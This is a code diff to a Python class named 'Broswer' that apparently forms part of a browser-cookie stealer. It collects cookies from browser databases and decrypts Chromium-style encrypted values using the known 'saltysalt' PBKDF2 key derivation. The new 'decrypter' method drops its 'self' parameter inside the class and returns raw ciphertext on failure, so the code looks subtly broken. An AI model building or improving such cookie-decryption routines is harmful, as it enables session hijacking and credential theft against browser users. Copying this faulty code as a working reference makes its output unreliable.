@@ -94,29 +94,21 @@ class Broswer:
             if cookies_data:
                 self.cookies_path.append({browser_name: cookies_data})
 
-    def decrypter(self, cipher_text, key):
-        # Decode base64 encoded ciphertext
-        cipher_text = base64.b64decode(cipher_text)
-
-        # Correctly derive key
-        key = hashlib.pbkdf2_hmac('sha1', key.encode('utf-8'), b'saltysalt', 1003)[:16]
-
-        # Use a proper IV if known; here it's assumed as 16 bytes of zeros for example purposes
-        iv = bytes([0x20] * 16)  # Adjust this based on actual encryption settings
-
+    def decrypter(cipher_text, key):
         try:
-            # Initialize cipher
+            cipher_text = cipher_text[3:]
+            cipher_text = base64.b64decode(cipher_text)
+            iv = b' ' * 16
+            key = hashlib.pbkdf2_hmac('sha1', key.encode('utf-8'), b'saltysalt', 1003)[:16]
             cipher = AES.new(key, AES.MODE_CBC, iv)
 
-            # Decrypt and remove padding
-            decrypted = cipher.decrypt(cipher_text)
-            padding_length = decrypted[-1]
-            decrypted = decrypted[:-padding_length]
+            decrypted_data = cipher.decrypt(cipher_text)
+            decrypted_data = decrypted_data[:-decrypted_data[-1]]
 
-            return decrypted.decode('utf-8')
+            return decrypted_data.decode('utf-8')
         except Exception as e:
             print(f"[-] Error decrypting data: {e}")
-            return None
+            return cipher_text  # Возвращаем исходный текст в случае ошибки
 
               
     def browse_browser_db(self, browser_data_paths, query_type): 
